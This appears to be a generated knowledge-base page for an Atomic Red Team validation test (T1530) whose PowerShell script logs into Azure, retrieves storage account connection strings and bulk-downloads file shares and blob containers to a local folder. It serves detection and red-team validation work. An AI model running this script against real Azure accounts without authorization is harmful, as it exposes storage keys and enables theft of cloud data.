---
atomic_guid: "67374845-b4c8-4204-adcc-9b217b65d4f1"
title: "Azure - Dump Azure Storage Account Objects via Azure CLI"
framework: "atomic"
generated: "true"
attack_technique_id: "T1530"
attack_technique_name: "Data from Cloud Storage Object"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1530/T1530.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "67374845-b4c8-4204-adcc-9b217b65d4f1"
  - "Azure - Dump Azure Storage Account Objects via Azure CLI"
platforms:
  - "iaas:azure"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Azure - Dump Azure Storage Account Objects via Azure CLI

This test dumps the content of the storage account objects present in the file defined in file_shares_csv_file_path. Note that this file is created in the atomic test T1619 "Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI". When created manually, it must contain the columns "ResourceGroup","StorageAccountName", "FileShareName", "ContainerName", "BlobName".

Requirements:
    - The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.
    - The EntraID user must have the role "Storage Account Contributor", or a role with similar permissions.

## Metadata

- Atomic GUID: 67374845-b4c8-4204-adcc-9b217b65d4f1
- Technique: T1530: Data from Cloud Storage Object
- Platforms: iaas:azure
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1530/T1530.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1530-data_from_cloud_storage|T1530]]

## Input Arguments

### output_folder

- description: Folder path to output file share content to
- type: path
- default: $env:temp\T1530_storage_account_objects

### storage_account_objects_csv_file_path

- description: Path to file that contains all storage account objects in form of a csv file. This may be the result from Test T1619 "Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI".
- type: path
- default: $env:temp\T1619_storage_account_objects.csv

## Dependencies

Azure CLI must be installed

### Prerequisite Check

```powershell
try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```

### Get Prerequisite

```powershell
Install-Module -Name Az -Force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$storage_account_objects = Import-Csv -Path "#{storage_account_objects_csv_file_path}"

# Login to Azure
az login

if (-not (Test-Path -Path "#{output_folder}")) {
    New-Item -ItemType Directory -Path "#{output_folder}"
}

foreach ($row in $storage_account_objects) {
    
    if ($row.FileShareName -ne ""){
        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query "allowSharedKeyAccess"

        if ($allowSharedKeyAccess -eq "false") {    # $allowSharedKeyAccess could be true or null
            Write-Output "Shared key access is disabled for this storage account."
        } else {
            Write-Output "Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ..."
            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
            
            # Create folder for storage account objects
            $storageAccountOutputPath = Join-Path #{output_folder} "$($row.ResourceGroup)_$($row.StorageAccountName)"
            if (-not (Test-Path -Path $storageAccountOutputPath)) {
                New-Item -ItemType Directory -Path $storageAccountOutputPath
            }

            # create folder for file share content
            $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName
            if (-not (Test-Path -Path $fileSharePath)) {
                New-Item -ItemType Directory -Path $fileSharePath
            }
            az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath
        }
    } elseif ($row.ContainerName -ne "" -and $row.BlobName -eq "") {
        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query "allowSharedKeyAccess"

        if ($allowSharedKeyAccess -eq "false") {    # $allowSharedKeyAccess could be true or null
            Write-Output "Shared key access is disabled for this storage account."
        } else {
            Write-Output "Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ..."
            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
            
            # Create folder for storage account objects
            $storageAccountOutputPath = Join-Path #{output_folder} "$($row.ResourceGroup)_$($row.StorageAccountName)"
            if (-not (Test-Path -Path $storageAccountOutputPath)) {
                New-Item -ItemType Directory -Path $storageAccountOutputPath
            }

            # create folder for blob content
            $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName
            if (-not (Test-Path -Path $containerFolderPath)) {
                New-Item -ItemType Directory -Path $containerFolderPath
            }
            az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString
        }
    }
}
```

### Cleanup

```powershell
Remove-Item -Path "#{output_folder}" -Recurse -Force -erroraction silentlycontinue
Write-Output "Removed #{output_folder}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1530/T1530.yaml)
